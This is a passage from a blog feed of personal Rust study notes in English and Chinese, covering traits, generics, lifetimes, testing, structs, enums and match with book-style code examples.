class="line">&#125;</span><br></pre></td></tr></table></figure><p>Note that because we defined the Summary trait and the NewsArticle and Tweet types in the same lib.rs in Listing 10-13, they’re all in the same scope. Let’s say this lib.rs is for a crate we’ve called aggregator and someone else wants to use our crate’s functionality to implement the Summary trait on a struct defined within their library’s scope. They would need to bring the trait into their scope first. They would do so by specifying use <code>aggregator::Summary;</code>, which then would enable them to implement Summary for their type. The Summary trait would also need to be a public trait for another crate to implement it, which it is because we put the pub keyword before trait in Listing 10-12.</p><p>with trait implementations is that we can<code>implement a trait on a type only if either the trait or the type is local to our crate</code><br><code>can’t implement external traits on external types.</code></p><p>as we implement the trait on a particular type, we can keep or override each method’s default behavior.<br>specify an empty impl block with impl Summary for NewsArticle {}.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        String::from(<span class="string">"(Read more...)"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct NewsArticle &#123;</span><br><span class="line">    pub <span class="symbol">headline:</span> String,</span><br><span class="line">    pub <span class="symbol">location:</span> String,</span><br><span class="line">    pub <span class="symbol">author:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> NewsArticle &#123;&#125;</span><br><span class="line"></span><br><span class="line">pub struct Tweet &#123;</span><br><span class="line">    pub <span class="symbol">username:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">    pub <span class="symbol">reply:</span> bool,</span><br><span class="line">    pub <span class="symbol">retweet:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> Tweet &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">"&#123;&#125;: &#123;&#125;"</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Default implementations can call other methods in the same trait, even if those other methods don’t have a default implementation.</p><p>![allow(unused_variables)]<br>fn main() {<br>pub trait Summary {<br>    fn summarize_author(&amp;self) -&gt; String;</p><pre><code>fn summarize(&amp;self) -&gt; String {    format!(&quot;(Read more from {}...)&quot;, self.summarize_author())}</code></pre><p>}</p><p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p><p>impl Summary for Tweet {<br>    fn summarize_author(&amp;self) -&gt; String {<br>        format!(“@{}”, self.username)<br>    }<br>}<br>}</p><p>pub trait Summary {<br>    fn summarize(&amp;self) -&gt; String;<br>}</p><p>pub struct NewsArticle {<br>    pub headline: String,<br>    pub location: String,<br>    pub author: String,<br>    pub content: String,<br>}</p><p>impl Summary for NewsArticle {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}, by {} ({})”, self.headline, self.author, self.location)<br>    }<br>}</p><p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p><p>impl Summary for Tweet {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}: {}”, self.username, self.content)<br>    }<br>}</p><p>pub fn notify(item: &amp;impl Summary) {<br>    println!(“Breaking news! {}”, item.summarize());<br>}</p><h3 id="bound-trait"><a href="#bound-trait" class="headerlink" title="bound trait"></a>bound trait</h3><p>pub fn notify&lt;T: Summary&gt;(item1: &amp;T, item2: &amp;T) {<br>传入的类型必须相同</p><pre><code>pub fn notify(item: &amp;(impl Summary + Display)) {pub fn notify&lt;T: Summary + Display&gt;(item: &amp;T) {fn some_function&lt;T, U&gt;(t: &amp;T, u: &amp;U) -&gt; i32    where T: Display + Clone,          U: Clone + Debug{</code></pre><p>an also use the impl Trait syntax in the return position to return a value of some type that implements a trait,<br>pub trait Summary {<br>    fn summarize(&amp;self) -&gt; String;<br>}</p><p>pub struct NewsArticle {<br>    pub headline: String,<br>    pub location: String,<br>    pub author: String,<br>    pub content: String,<br>}</p><p>impl Summary for NewsArticle {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}, by {} ({})”, self.headline, self.author, self.location)<br>    }<br>}</p><p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p><p>impl Summary for Tweet {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}: {}”, self.username, self.content)<br>    }<br>}</p><p>fn returns_summarizable() -&gt; <code>impl Summary {</code><br>    Tweet {<br>        username: String::from(“horse_ebooks”),<br>        content: String::from(<br>            “of course, as you probably already know, people”,<br>        ),<br>        reply: false,<br>        retweet: false,<br>    }<br>}</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn largest&lt;<span class="symbol">T:</span> PartialOrd + Copy&gt;(<span class="symbol">list:</span> &amp;[T]) -&gt; T &#123; <span class="regexp">//</span>限制只能传进i32 char等</span><br><span class="line">    let mut largest = list[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &amp;item <span class="keyword">in</span> list &#123;</span><br><span class="line">        <span class="keyword">if</span> item &gt; largest &#123;</span><br><span class="line">            largest = item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    largest</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fn main() {<br>    let number_list = vec![34, 50, 25, 100, 65];</p><pre><code>let result = largest(&amp;number_list);println!(&quot;The largest number is {}&quot;, result);let char_list = vec![&apos;y&apos;, &apos;m&apos;, &apos;a&apos;, &apos;q&apos;];let result = largest(&amp;char_list);println!(&quot;The largest char is {}&quot;, result);</code></pre><p>}</p><p>impl&lt;T: Display&gt; ToString for T {<br>    // –snip–<br>}</p><h3 id="The-Borrow-Checker"><a href="#The-Borrow-Checker" class="headerlink" title="The Borrow Checker"></a>The Borrow Checker</h3><p>we’ll add generic lifetime parameters that define the relationship between the references </p><p>lifetime<br>Lifetime annotations <code>don’t change</code> how long any of the references live. </p><pre><code>&amp;i32        // a reference&amp;&apos;a i32     // a reference with an explicit lifetime&amp;&apos;a mut i32 // a mutable reference with an explicit lifetime</code></pre><p>have a function with the parameter first that is a reference to an i32 with lifetime ‘a. The function also has another parameter named second that is another reference to an i32 that also has the lifetime ‘a. The lifetime annotations indicate that the references first and second must both live as long as that generic lifetime.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let string1 = String::from(<span class="string">"abcd"</span>);</span><br><span class="line">    let string2 = <span class="string">"xyz"</span>;</span><br><span class="line"></span><br><span class="line">    let result = longest(string1.as_str(), string2);</span><br><span class="line">    println!(<span class="string">"The longest string is &#123;&#125;"</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn longest&lt;<span class="string">'a&gt;(x: &amp;'</span>a str, <span class="symbol">y:</span> &amp;<span class="string">'a str) -&gt; &amp;'</span>a str &#123;</span><br><span class="line">    <span class="keyword">if</span> x.len() &gt; y.len() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>返回的引用取最短的lifetime</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct ImportantExcerpt&lt;<span class="string">'a&gt; &#123;</span></span><br><span class="line"><span class="string">    part: &amp;'</span>a str,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let novel = String::from(<span class="string">"Call me Ishmael. Some years ago..."</span>);</span><br><span class="line">    let first_sentence = novel.split(<span class="string">'.'</span>).<span class="keyword">next</span>().expect(<span class="string">"Could not find a '.'"</span>);</span><br><span class="line">    let i = ImportantExcerpt &#123;</span><br><span class="line">        <span class="symbol">part:</span> first_sentence,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>an instance of ImportantExcerpt can’t <code>outlive the reference it</code><br>holds in its part field.</p><h3 id="Lifetime-Elision"><a href="#Lifetime-Elision" class="headerlink" title="Lifetime Elision"></a>Lifetime Elision</h3><p>由编译器进行引用lifetime的编写<br>三个阶段</p><h4 id="The-Static-Lifetime"><a href="#The-Static-Lifetime" class="headerlink" title="The Static Lifetime"></a>The Static Lifetime</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">let <span class="symbol">s:</span> &amp;<span class="string">'static str = "I have a static lifetime.";</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>means that this reference can live for the entire duration of the program</p><p> lifetimes are a type of generic,<br>fn main() {<br>    let string1 = String::from(“abcd”);<br>    let string2 = “xyz”;</p><pre><code>let result = longest_with_an_announcement(    string1.as_str(),    string2,    &quot;Today is someone&apos;s birthday!&quot;,);println!(&quot;The longest string is {}&quot;, result);</code></pre><p>}</p><p>use std::fmt::Display;</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fn longest_with_an_announcement&lt;<span class="string">'a, T&gt;(</span></span><br><span class="line"><span class="string">    x: &amp;'</span>a str,</span><br><span class="line">    <span class="symbol">y:</span> &amp;<span class="string">'a str,</span></span><br><span class="line"><span class="string">    ann: T,</span></span><br><span class="line"><span class="string">) -&gt; &amp;'</span>a str</span><br><span class="line">where</span><br><span class="line">    <span class="symbol">T:</span> Display,</span><br><span class="line">&#123;</span><br><span class="line">    println!(<span class="string">"Announcement! &#123;&#125;"</span>, ann);</span><br><span class="line">    <span class="keyword">if</span> x.len() &gt; y.len() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>cargo test<br>Checking Results with the assert! Macro<br>The <code>assert!</code>macro, provided by the standard library, is useful when you want to ensure that some condition in a test evaluates to true.</p><p><code>assert_eq! and assert_ne!</code>These macros compare two arguments for equality or inequality, respectively. </p><p>should_panic  产生panic返回正确<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pub struct Guess &#123;</span><br><span class="line">    <span class="symbol">value:</span> i32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Guess &#123;</span><br><span class="line">    pub fn new(<span class="symbol">value:</span> i32) -&gt; Guess &#123;</span><br><span class="line">        <span class="keyword">if</span> value &lt; <span class="number">1</span> <span class="params">||</span> value &gt; <span class="number">100</span> &#123;</span><br><span class="line">            panic!(<span class="string">"Guess value must be between 1 and 100, got &#123;&#125;."</span>, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Guess &#123; value &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[cfg(test)]</span></span><br><span class="line">mod tests &#123;</span><br><span class="line">    use super::*;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#[test]</span></span><br><span class="line">    <span class="comment">#[should_panic]</span></span><br><span class="line">    fn greater_than_10<span class="number">0</span>() &#123;</span><br><span class="line">        Guess::new(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[test]</span></span><br><span class="line"><span class="comment">#[should_panic(expected = "Guess value must be less than or equal to 100")]</span></span><br></pre></td></tr></table></figure></p><p>the unit type, ()</p><p>TDD process</p><p>test 还是很不多的，C++的时候都一遍遍输入参数</p><p><code>$ cargo run &gt; output.txt</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Result-lt-T-E-gt&quot;&gt;&lt;a href=&quot;#Result-lt-T-E-gt&quot; class=&quot;headerlink&quot; title=&quot;Result&amp;lt;T, E&amp;gt;&quot;&gt;&lt;/a&gt;Result&lt;code&gt;&amp;lt;T, E&amp;gt;&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;Rust doesn’t have exceptions. Instead, it has the type&lt;code&gt;Result&amp;lt;T, E&amp;gt;&lt;/code&gt; for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. &lt;/p&gt;
&lt;p&gt;When the &lt;code&gt;panic!&lt;/code&gt;macro executes, your program will print a failure message, unwind and clean up the stack, and then quit.&lt;br&gt;
    
    </summary>
    
    
      <category term="RUST" scheme="http://finsenty54.github.io/tags/RUST/"/>
    
  </entry>
  
  <entry>
    <title>RUST学习3</title>
    <link href="http://finsenty54.github.io/2020/08/03/RUST%E5%AD%A6%E4%B9%A03/"/>
    <id>http://finsenty54.github.io/2020/08/03/RUST学习3/</id>
    <published>2020-08-03T05:58:28.000Z</published>
    <updated>2020-08-03T05:59:20.019Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>The <code>Debug trait</code>enables us to print our struct in a way that is useful for developers so we can see its value while we’re debugging our code.<br><a id="more"></a><br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[derive(Debug)]  //开启使用debug :?打印结构体</span><br><span class="line">struct Rectangle &#123;</span><br><span class="line">    width: u32,</span><br><span class="line">    height: u32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let rect1 = Rectangle &#123;</span><br><span class="line">        width: <span class="number">30</span>,</span><br><span class="line">        height: <span class="number">50</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"rect1 is &#123;:?&#125;"</span>, rect1);  //or&#123;:<span class="comment">#?&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="method"><a href="#method" class="headerlink" title="method"></a>method</h3><p>their first parameter is <code>always self,</code>which represents the instance of the struct the method is being called on.</p><p>impl (implementation)</p><p>Methods can<code>take ownership of self,</code> borrow<code>self immutably</code>as we’ve done here, or borrow self mutably, just as they can any other parameter.<br><code>&amp;mut self</code></p><h3 id="associated-function"><a href="#associated-function" class="headerlink" title="associated function"></a>associated function</h3><p>You’ve already used the String::from associated function.</p><p>Associated functions are often used for constructors that will <code>return a new instance of the struct.</code><br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[derive(Debug)]</span><br><span class="line">struct Rectangle &#123;</span><br><span class="line">    width: u32,</span><br><span class="line">    height: u32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Rectangle &#123;</span><br><span class="line">    fn square(size: u32) -&gt; Rectangle &#123;  //没有self</span><br><span class="line">        Rectangle &#123;</span><br><span class="line">            width: size,</span><br><span class="line">            height: size,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let sq = Rectangle::square(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Each struct is allowed to have multiple impl blocks. </p><h3 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h3><p>枚举<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enum IpAddrKind &#123;</span><br><span class="line">    V4,  //V4 V6就是所谓的变体</span><br><span class="line">    V6,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let four = IpAddrKind::V4;</span><br><span class="line">    let six = IpAddrKind::V6;</span><br><span class="line"></span><br><span class="line">    route(IpAddrKind::V4);</span><br><span class="line">    route(IpAddrKind::V6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn route(ip_kind: IpAddrKind) &#123;&#125;</span><br></pre></td></tr></table></figure></p><p>枚举比struct更简明<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum IpAddr &#123;</span><br><span class="line">        V4(String),</span><br><span class="line">        V6(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let home = IpAddr::V4(String::from(<span class="string">"127.0.0.1"</span>));</span><br><span class="line"></span><br><span class="line">    let loopback = IpAddr::V6(String::from(<span class="string">"::1"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>枚举每个变体可以有不同的类型<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum IpAddr &#123;</span><br><span class="line">        V4(u8, u8, u8, u8),</span><br><span class="line">        V6(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let home = IpAddr::V4(<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    let loopback = IpAddr::V6(String::from(<span class="string">"::1"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">struct Ipv4Addr &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Ipv6Addr &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum IpAddr &#123;</span><br><span class="line">    V4(Ipv4Addr),</span><br><span class="line">    V6(Ipv6Addr),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum Message &#123;</span><br><span class="line">    Quit,</span><br><span class="line">    Move &#123; x: i32, y: i32 &#125;,</span><br><span class="line">    Write(String),</span><br><span class="line">    ChangeColor(i32, i32, i32),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    enum Message &#123;</span><br><span class="line">        Quit,</span><br><span class="line">        Move &#123; x: i32, y: i32 &#125;,</span><br><span class="line">        Write(String),</span><br><span class="line">        ChangeColor(i32, i32, i32),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    impl Message &#123;</span><br><span class="line">        fn call(&amp;self) &#123;</span><br><span class="line">            // method body would be defined here</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let m = Message::Write(String::from(<span class="string">"hello"</span>));</span><br><span class="line">    m.call();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="enum-option"><a href="#enum-option" class="headerlink" title="enum option"></a>enum option</h3><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">![allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">enum Option&lt;<span class="literal">T</span>&gt; &#123; //&lt;<span class="literal">T</span>&gt; means the Some variant of the Option enum can hold one piece of data of any type</span><br><span class="line">    Some(<span class="literal">T</span>),</span><br><span class="line">    None,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>option不用显示引入，已经提前有了</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_number = Some(<span class="number">5</span>);</span><br><span class="line">    let some_string = Some(<span class="string">"a string"</span>);</span><br><span class="line"></span><br><span class="line">    let absent_number: Option&lt;i32&gt; = None;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If we use None rather than Some, we need to tell Rust what<code>type of Option&lt;T&gt;</code> we have<br>Option<t> and T (where T can be any type) are different types,<br>In other words, you have to convert an Option<t> to a <code>T</code> before you can perform T operations with it. </t></t></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">match</span><br><span class="line">enum Coin &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br></pre></td></tr></table></figure><p>The code associated with <code>each arm is an expression</code>, and the resulting value of the expression in the matching arm is the value that gets returned for the entire match expression.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; &#123;</span><br><span class="line">            println!(<span class="string">"Lucky penny!"</span>);</span><br><span class="line">            <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[derive(Debug)]</span><br><span class="line">enum UsState &#123;</span><br><span class="line">    Alabama,</span><br><span class="line">    Alaska,</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum Coin &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter(UsState),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter(state) =&gt; &#123;</span><br><span class="line">            println!(<span class="string">"State quarter from &#123;:?&#125;!"</span>, state); //得到coin里quarter里的usstate值</span><br><span class="line">            <span class="number">25</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() 